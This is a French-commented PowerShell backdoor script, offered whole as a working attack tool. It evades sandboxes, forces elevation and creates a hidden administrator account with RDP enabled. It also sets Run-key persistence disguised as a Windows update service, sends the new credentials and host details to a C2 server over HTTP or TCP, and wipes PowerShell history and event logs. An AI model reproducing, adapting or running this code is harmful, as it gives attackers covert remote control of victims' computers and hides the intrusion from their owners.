# ============================================================
# SCRIPT BACKDOOR - Version avec exfiltration vers C2
# Serveur C2 : 10.10.1.32
# ============================================================

$ErrorActionPreference = "Continue"

Write-Host "[DEBUG] Début du script" -ForegroundColor Cyan

# ──────────────────────────────────────────────────────────────
# 1. ANTI-SANDBOX (Version allégée pour compatibilité)
# ──────────────────────────────────────────────────────────────
function Test-Sandbox {
    Write-Host "[DEBUG] Vérification environnement..."
    
    # Vérification mémoire uniquement
    $mem = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    Write-Host "[DEBUG] Mémoire détectée: $([math]::Round($mem,2)) GB"
    
    if ($mem -lt 1) {
        Write-Host "[DEBUG] Mémoire insuffisante → environnement suspect"
        return $true
    }
    
    Write-Host "[DEBUG] Environnement accepté"
    return $false
}

if (Test-Sandbox) { 
    Write-Host "[DEBUG] Sandbox détectée, arrêt" -ForegroundColor Red
    exit 
}
Write-Host "[DEBUG] ✅ Environnement vérifié" -ForegroundColor Green

# ──────────────────────────────────────────────────────────────
# 2. ÉLÉVATION DE PRIVILÈGES
# ──────────────────────────────────────────────────────────────
function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[DEBUG] Pas admin, demande d'élévation..." -ForegroundColor Yellow
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    exit
}
Write-Host "[DEBUG] ✅ Droits ADMIN obtenus" -ForegroundColor Green

# ──────────────────────────────────────────────────────────────
# 3. CRÉATION DU COMPTE BACKDOOR (Version française)
# ──────────────────────────────────────────────────────────────
Write-Host "[DEBUG] Création du compte backdoor..."

$charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
$suffix = -join ($charset.ToCharArray() | Get-Random -Count 6)
$backdoorUser = "svc_" + $suffix
$backdoorPass = "P@ssw0rd123!"

# Suppression si existe déjà
net user $backdoorUser /delete 2>$null

# Création
net user $backdoorUser $backdoorPass /add

if ($LASTEXITCODE -eq 0) {
    Write-Host "[DEBUG] ✅ Utilisateur créé: $backdoorUser" -ForegroundColor Green
} else {
    Write-Host "[DEBUG] ❌ Erreur création" -ForegroundColor Red
    exit
}

# Ajout aux groupes
net localgroup "Administrateurs" $backdoorUser /add
net localgroup "Utilisateurs de Bureau à Distance" $backdoorUser /add

# Activation RDP
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
netsh advfirewall firewall add rule name="RDP_Backdoor" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1

Write-Host "[DEBUG] ✅ RDP activé" -ForegroundColor Green

# ──────────────────────────────────────────────────────────────
# 4. PERSISTANCE
# ──────────────────────────────────────────────────────────────
$scriptPath = $MyInvocation.MyCommand.Path

# Clé Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService" -Value "powershell.exe -WindowStyle Hidden -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue

Write-Host "[DEBUG] ✅ Persistance installée" -ForegroundColor Yellow

# ──────────────────────────────────────────────────────────────
# 5. EXFILTRATION VERS LE SERVEUR C2 (10.10.1.32)
# ──────────────────────────────────────────────────────────────
function Exfiltrate-ToC2 {
    Write-Host "[DEBUG] Préparation de l'exfiltration..." -ForegroundColor Yellow
    
    $computerName = $env:COMPUTERNAME
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*"}).IPAddress -join ","
    
    # Tentative de récupération IP publique
    $publicIP = "Non disponible"
    try {
        $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content 2>$null
    } catch {
        $publicIP = "Non disponible"
    }
    
    # Création du payload JSON
    $payload = @{
        victim = $computerName
        user = $backdoorUser
        pass = $backdoorPass
        local_ip = $localIP
        public_ip = $publicIP
        timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        os_version = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue).ProductName
    }
    
    $jsonPayload = $payload | ConvertTo-Json
    
    Write-Host "[DEBUG] Payload préparé:" -ForegroundColor Cyan
    Write-Host $jsonPayload -ForegroundColor DarkGray
    
    # ──────────────────────────────────────────────────────────
    # ENVOI VERS LE SERVEUR C2 (10.10.1.32)
    # ──────────────────────────────────────────────────────────
    
    $c2IP = "10.10.1.32"
    $c2Port = 8080
    $c2Server = "http://${c2IP}:${c2Port}/callback"
    
    Write-Host "[DEBUG] Tentative d'envoi vers $c2Server" -ForegroundColor Yellow
    
    # Méthode 1 : HTTP POST
    try {
        $response = Invoke-RestMethod -Uri $c2Server -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 10 -ErrorAction Stop
        Write-Host "[DEBUG] ✅ Credentials envoyés vers C2 (HTTP)" -ForegroundColor Green
    } catch {
        Write-Host "[DEBUG] ❌ Échec HTTP: $($_.Exception.Message)" -ForegroundColor Red
        
        # Méthode 2 : TCP direct (fallback)
        try {
            $tcpClient = New-Object System.Net.Sockets.TCPClient
            $tcpClient.Connect($c2IP, $c2Port)
            $stream = $tcpClient.GetStream()
            $data = [Text.Encoding]::UTF8.GetBytes($jsonPayload + "`n")
            $stream.Write($data, 0, $data.Length)
            $tcpClient.Close()
            Write-Host "[DEBUG] ✅ Credentials envoyés vers C2 (TCP)" -ForegroundColor Green
        } catch {
            Write-Host "[DEBUG] ❌ Échec TCP: $($_.Exception.Message)" -ForegroundColor Red
            
            # Sauvegarde locale en cas d'échec total
            $jsonPayload | Out-File -FilePath "$env:TEMP\svchost_log.txt" -Encoding UTF8 -ErrorAction SilentlyContinue
            Write-Host "[DEBUG] ⚠️ Sauvegarde locale dans %TEMP%\svchost_log.txt" -ForegroundColor Yellow
        }
    }
}

# Appel de la fonction d'exfiltration
Exfiltrate-ToC2

# ──────────────────────────────────────────────────────────────
# 6. SAUVEGARDE LOCALE DES INFOS (toujours utile)
# ──────────────────────────────────────────────────────────────
$computerName = $env:COMPUTERNAME
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*"}).IPAddress -join ","

$info = @"
========================================
BACKDOOR INSTALLÉ
========================================
Date: $(Get-Date)
Ordinateur: $computerName
Utilisateur: $backdoorUser
Mot de passe: $backdoorPass
IP: $localIP
RDP: Activé sur port 3389
Serveur C2: 10.10.1.32:8080
========================================
"@

# Sauvegarde locale
$info | Out-File -FilePath "$env:TEMP\svchost_log.txt" -Encoding UTF8 -ErrorAction SilentlyContinue
$info | Out-File -FilePath "$env:USERPROFILE\Documents\readme.txt" -Encoding UTF8 -ErrorAction SilentlyContinue

Write-Host "[DEBUG] ✅ Informations sauvegardées localement" -ForegroundColor Green

# ──────────────────────────────────────────────────────────────
# 7. NETTOYAGE DES TRACES
# ──────────────────────────────────────────────────────────────
Write-Host "[DEBUG] Nettoyage des traces..." -ForegroundColor Yellow

# Suppression historique PowerShell
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue

# Suppression des logs Windows
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

Write-Host "[DEBUG] ✅ Traces nettoyées" -ForegroundColor DarkGray

# ──────────────────────────────────────────────────────────────
# 8. RÉSULTAT FINAL
# ──────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "=========================================" -ForegroundColor Green
Write-Host "BACKDOOR INSTALLÉ AVEC SUCCÈS" -ForegroundColor Green
Write-Host "=========================================" -ForegroundColor Green
Write-Host "Compte    : $backdoorUser" -ForegroundColor Cyan
Write-Host "Mot passe : $backdoorPass" -ForegroundColor Cyan
Write-Host "RDP       : Activé sur port 3389" -ForegroundColor Cyan
Write-Host "IP locale : $localIP" -ForegroundColor Cyan
Write-Host "C2 cible  : 10.10.1.32:8080" -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Green
Write-Host ""
Write-Host "[INFO] Fichier de log: %TEMP%\svchost_log.txt" -ForegroundColor Yellow
Write-Host "[INFO] Connexion RDP: mstsc /v:$localIP" -ForegroundColor Yellow
Write-Host ""